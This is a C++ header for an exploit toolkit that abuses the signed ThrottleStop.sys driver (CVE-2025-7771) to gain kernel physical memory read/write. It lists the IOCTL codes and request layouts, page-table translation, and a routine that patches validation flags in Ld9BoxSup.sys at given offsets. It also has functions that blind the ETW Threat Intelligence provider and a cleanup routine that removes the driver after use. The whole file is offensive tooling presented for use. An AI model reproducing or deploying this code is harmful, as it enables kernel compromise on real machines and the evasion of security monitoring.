/**
 * @file throttlestop_exploit.h
 * @brief ThrottleStop.sys exploitation interface for kernel primitive access
 *
 * Exploits ThrottleStop.sys (CPU undervolting utility) to gain physical memory
 * read/write primitives. ThrottleStop uses MmMapIoSpace for MSR/physical memory
 * access, and is NOT on Microsoft's driver blocklist as of December 2025.
 *
 * CVE: CVE-2025-7771
 * IOCTLs: 0x80006498 (read), 0x8000649C (write)
 *
 * Primary use case: Patch Ld9BoxSup.sys -618 validation flags to enable LDR_OPEN
 *
 * Attack Flow:
 *   1. Load ThrottleStop.sys (signed, not blocklisted)
 *   2. Open device handle
 *   3. Translate driver VA → PA (walk page tables)
 *   4. Write 1 to ntoskrnl_flag and hal_flag (2 bytes total)
 *   5. Unload ThrottleStop.sys
 *   6. LDR_OPEN now works!
 */

#pragma once
#include <Windows.h>
#include <cstdint>
#include <string>
#include <vector>

namespace throttlestop {

//===----------------------------------------------------------------------===//
// ThrottleStop IOCTL Definitions
//===----------------------------------------------------------------------===//

// Device name - ThrottleStop creates a standard DosDevices symlink
constexpr const wchar_t* DEVICE_NAME = L"\\\\.\\ThrottleStop";
constexpr const wchar_t* DEVICE_NAME_ALT = L"\\\\.\\YOURDRIVER";  // Some versions use this

// IOCTL codes for physical memory access
// These use METHOD_BUFFERED, FILE_ANY_ACCESS
constexpr DWORD IOCTL_PHYS_READ  = 0x80006498;
constexpr DWORD IOCTL_PHYS_WRITE = 0x8000649C;

// Alternative IOCTLs found in some versions
constexpr DWORD IOCTL_MAP_PHYS   = 0x80006490;  // Map physical to user VA
constexpr DWORD IOCTL_UNMAP_PHYS = 0x80006494;  // Unmap

//===----------------------------------------------------------------------===//
// IOCTL Structures (CVE-2025-7771 compatible)
//===----------------------------------------------------------------------===//

// NOTE: ThrottleStop.sys uses a DIFFERENT calling convention than most drivers:
//
// READ (0x80006498):
//   - Input buffer: ULONGLONG PhysicalAddress (8 bytes ONLY)
//   - Input buffer size: 8
//   - Output buffer: receives the read data
//   - Output buffer size: 1, 2, 4, or 8 (THIS determines read size)
//   - The driver uses MmMapIoSpace and reads exactly outputSize bytes
//
// WRITE (0x8000649C):
//   - Input buffer: PhysicalAddress (8 bytes) + Value (1/2/4/8 bytes)
//   - Input buffer size: 9, 10, 12, or 16 (8 + write size)
//   - Output buffer: unused (NULL)
//   - Output buffer size: 0
//
// There is NO "Size" field - size is determined by buffer sizes!

#pragma pack(push, 1)
// Write request: 8-byte address followed by the value to write
struct PHYS_WRITE_REQUEST_8 {
    uint64_t PhysicalAddress;
    uint64_t Value;
};

struct PHYS_WRITE_REQUEST_4 {
    uint64_t PhysicalAddress;
    uint32_t Value;
};

struct PHYS_WRITE_REQUEST_2 {
    uint64_t PhysicalAddress;
    uint16_t Value;
};

struct PHYS_WRITE_REQUEST_1 {
    uint64_t PhysicalAddress;
    uint8_t Value;
};
#pragma pack(pop)

//===----------------------------------------------------------------------===//
// Page Table Constants (for VA→PA translation)
//===----------------------------------------------------------------------===//

constexpr uint64_t PML4E_MASK = 0x0000FF8000000000ULL;  // Bits 47:39
constexpr uint64_t PDPTE_MASK = 0x0000007FC0000000ULL;  // Bits 38:30
constexpr uint64_t PDE_MASK   = 0x000000003FE00000ULL;  // Bits 29:21
constexpr uint64_t PTE_MASK   = 0x00000000001FF000ULL;  // Bits 20:12
constexpr uint64_t OFFSET_MASK = 0x0000000000000FFFULL; // Bits 11:0

constexpr uint64_t PAGE_PRESENT = 1ULL << 0;
constexpr uint64_t PAGE_LARGE   = 1ULL << 7;
constexpr uint64_t PFN_MASK     = 0x000FFFFFFFFFF000ULL;

// Shifts for index extraction
constexpr int PML4E_SHIFT = 39;
constexpr int PDPTE_SHIFT = 30;
constexpr int PDE_SHIFT   = 21;
constexpr int PTE_SHIFT   = 12;

//===----------------------------------------------------------------------===//
// ThrottleStopExploit Class
//===----------------------------------------------------------------------===//

/**
 * ThrottleStopExploit - Uses ThrottleStop.sys for physical memory access
 *
 * Usage:
 *   ThrottleStopExploit exploit;
 *   if (!exploit.Initialize()) { handle error }
 *
 *   // Patch Ld9BoxSup.sys -618 flags
 *   uint64_t driverBase = exploit.GetDriverBase(L"Ld9BoxSup.sys");
 *   exploit.PatchByte618Flags(driverBase);
 *
 *   exploit.Cleanup();  // Unloads driver, deletes service
 */
class ThrottleStopExploit {
public:
    ThrottleStopExploit();
    ~ThrottleStopExploit();

    // Non-copyable
    ThrottleStopExploit(const ThrottleStopExploit&) = delete;
    ThrottleStopExploit& operator=(const ThrottleStopExploit&) = delete;

    //-------------------------------------------------------------------------
    // Initialization
    //-------------------------------------------------------------------------

    /**
     * Initialize - Deploy and open ThrottleStop.sys
     *
     * @param driverPath Path to ThrottleStop.sys (embedded or on disk)
     * @return true on success
     *
     * If driverPath is empty, uses embedded driver bytes.
     * Creates service, starts driver, opens device.
     */
    bool Initialize(const std::wstring& driverPath = L"");

    /**
     * Check if initialized
     */
    bool IsInitialized() const { return m_bInitialized; }

    /**
     * Get last error message
     */
    const std::string& GetLastErrorMessage() const { return m_LastError; }

    //-------------------------------------------------------------------------
    // Physical Memory Primitives (CVE-2025-7771 compatible)
    //-------------------------------------------------------------------------

    /**
     * Granular physical memory reads - these are the native operations.
     * ThrottleStop only supports 1, 2, 4, or 8 byte reads at a time.
     * The output buffer size determines the read size.
     */
    bool ReadPhysical8(uint64_t physAddr, uint64_t& value);
    bool ReadPhysical4(uint64_t physAddr, uint32_t& value);
    bool ReadPhysical2(uint64_t physAddr, uint16_t& value);
    bool ReadPhysical1(uint64_t physAddr, uint8_t& value);

    /**
     * Granular physical memory writes - these are the native operations.
     * ThrottleStop only supports 1, 2, 4, or 8 byte writes at a time.
     * Input buffer is: PhysAddr (8 bytes) + Value (1/2/4/8 bytes)
     */
    bool WritePhysical8(uint64_t physAddr, uint64_t value);
    bool WritePhysical4(uint64_t physAddr, uint32_t value);
    bool WritePhysical2(uint64_t physAddr, uint16_t value);
    bool WritePhysical1(uint64_t physAddr, uint8_t value);

    /**
     * Read arbitrary-size physical memory (aggregates 8-byte reads)
     *
     * @param physAddr Physical address to read (should be 8-byte aligned for best perf)
     * @param buffer Output buffer
     * @param size Number of bytes to read
     * @return true on success
     *
     * Internally loops using 8-byte reads, then handles any remaining 1/2/4 bytes.
     */
    bool ReadPhysical(uint64_t physAddr, void* buffer, uint32_t size);

    /**
     * Write arbitrary-size physical memory (aggregates writes)
     *
     * @param physAddr Physical address to write
     * @param buffer Input buffer
     * @param size Number of bytes to write
     * @return true on success
     *
     * Internally loops using 8-byte writes, then handles any remaining 1/2/4 bytes.
     */
    bool WritePhysical(uint64_t physAddr, const void* buffer, uint32_t size);

    /**
     * Templated read - routes to appropriate granular method
     */
    template<typename T>
    bool ReadPhysical(uint64_t physAddr, T& value) {
        static_assert(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8,
                      "ReadPhysical<T> only supports 1, 2, 4, or 8 byte types");
        if constexpr (sizeof(T) == 8) {
            return ReadPhysical8(physAddr, reinterpret_cast<uint64_t&>(value));
        } else if constexpr (sizeof(T) == 4) {
            return ReadPhysical4(physAddr, reinterpret_cast<uint32_t&>(value));
        } else if constexpr (sizeof(T) == 2) {
            return ReadPhysical2(physAddr, reinterpret_cast<uint16_t&>(value));
        } else {
            return ReadPhysical1(physAddr, reinterpret_cast<uint8_t&>(value));
        }
    }

    /**
     * Templated write - routes to appropriate granular method
     */
    template<typename T>
    bool WritePhysical(uint64_t physAddr, const T& value) {
        static_assert(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8,
                      "WritePhysical<T> only supports 1, 2, 4, or 8 byte types");
        if constexpr (sizeof(T) == 8) {
            return WritePhysical8(physAddr, *reinterpret_cast<const uint64_t*>(&value));
        } else if constexpr (sizeof(T) == 4) {
            return WritePhysical4(physAddr, *reinterpret_cast<const uint32_t*>(&value));
        } else if constexpr (sizeof(T) == 2) {
            return WritePhysical2(physAddr, *reinterpret_cast<const uint16_t*>(&value));
        } else {
            return WritePhysical1(physAddr, *reinterpret_cast<const uint8_t*>(&value));
        }
    }

    //-------------------------------------------------------------------------
    // Virtual-to-Physical Translation
    //-------------------------------------------------------------------------

    /**
     * Translate virtual address to physical using CR3
     *
     * @param cr3 Page table root (SYSTEM CR3 for kernel addresses)
     * @param virtualAddr Virtual address to translate
     * @param physAddr [OUT] Physical address
     * @return true on success
     *
     * Walks the 4-level page table hierarchy:
     *   CR3 → PML4E → PDPTE → PDE → PTE → Physical
     *
     * Handles 1GB and 2MB large pages.
     */
    bool TranslateVirtToPhys(uint64_t cr3, uint64_t virtualAddr, uint64_t& physAddr);

    /**
     * Get SYSTEM process CR3 for kernel address translation
     *
     * @return CR3 value, or 0 on failure
     *
     * Reads from KPCR/KPRCB structure.
     */
    uint64_t GetSystemCr3();

    //-------------------------------------------------------------------------
    // Driver Base Address Resolution
    //-------------------------------------------------------------------------

    /**
     * Get kernel driver base address via NtQuerySystemInformation
     *
     * @param driverName Name of driver (e.g., L"Ld9BoxSup.sys")
     * @return Driver base address, or 0 if not found
     */
    static uint64_t GetDriverBase(const wchar_t* driverName);

    //-------------------------------------------------------------------------
    // -618 Bypass (Main Use Case)
    //-------------------------------------------------------------------------

    /**
     * Patch Ld9BoxSup.sys -618 validation flags
     *
     * @param ld9BoxBase Base address of Ld9BoxSup.sys
     * @return true if both flags patched successfully
     *
     * Patches:
     *   driver_base + 0x4a1a0 = 1 (ntoskrnl flag)
     *   driver_base + 0x4a210 = 1 (hal flag)
     *
     * After this, LDR_OPEN will succeed!
     */
    bool Patch618Flags(uint64_t ld9BoxBase);

    //-------------------------------------------------------------------------
    // ETW Blinding (Pre-Hypervisor)
    //-------------------------------------------------------------------------

    /**
     * Disable ETW-TI provider via physical memory write
     *
     * @param ntoskrnlBase Base address of ntoskrnl.exe
     * @param offset Offset to EtwThreatIntProvRegHandle
     * @return true on success
     *
     * Uses the same structure navigation as the VMCALL version,
     * but via physical memory primitives (before hypervisor is active).
     */
    bool DisableEtwTi(uint64_t ntoskrnlBase, uint64_t offset);

    /**
     * Restore ETW-TI provider
     *
     * @param ntoskrnlBase Base address of ntoskrnl.exe
     * @param offset Offset to EtwThreatIntProvRegHandle
     * @param savedValue Value saved by DisableEtwTi
     * @return true on success
     */
    bool EnableEtwTi(uint64_t ntoskrnlBase, uint64_t offset, uint64_t savedValue);

    //-------------------------------------------------------------------------
    // Cleanup
    //-------------------------------------------------------------------------

    /**
     * Cleanup - Close handle, stop and delete service
     *
     * Call this after patching is complete. The driver will be fully
     * removed from the system.
     */
    void Cleanup();

private:
    HANDLE          m_hDevice;
    SC_HANDLE       m_hSCManager;
    SC_HANDLE       m_hService;
    bool            m_bInitialized;
    bool            m_bDriverDeployed;
    std::wstring    m_ServiceName;
    std::wstring    m_DriverPath;
    std::string     m_LastError;
    uint64_t        m_SystemCr3;
    uint64_t        m_EtwSavedValue;

    // Service management
    bool CreateDriverService(const std::wstring& driverPath);
    bool StartDriverService();
    bool StopDriverService();
    bool DeleteDriverService();
    bool OpenDevice();

    // Error handling
    void SetError(const char* format, ...);

    // Cleanup helpers
    void CleanupArtifacts();
};

//===----------------------------------------------------------------------===//
// RAII Wrapper for Scoped Usage
//===----------------------------------------------------------------------===//

/**
 * ScopedThrottleStop - RAII wrapper that handles init/cleanup
 *
 * Usage:
 *   {
 *       ScopedThrottleStop ts;
 *       if (ts.IsValid()) {
 *           ts->Patch618Flags(driverBase);
 *       }
 *   }  // Automatically cleaned up here
 */
class ScopedThrottleStop {
public:
    explicit ScopedThrottleStop(const std::wstring& driverPath = L"")
        : m_exploit()
        , m_valid(false)
    {
        m_valid = m_exploit.Initialize(driverPath);
    }

    ~ScopedThrottleStop() {
        if (m_valid) {
            m_exploit.Cleanup();
        }
    }

    bool IsValid() const { return m_valid; }

    ThrottleStopExploit* operator->() { return &m_exploit; }
    ThrottleStopExploit& operator*() { return m_exploit; }

    // Non-copyable
    ScopedThrottleStop(const ScopedThrottleStop&) = delete;
    ScopedThrottleStop& operator=(const ScopedThrottleStop&) = delete;

private:
    ThrottleStopExploit m_exploit;
    bool m_valid;
};

} // namespace throttlestop
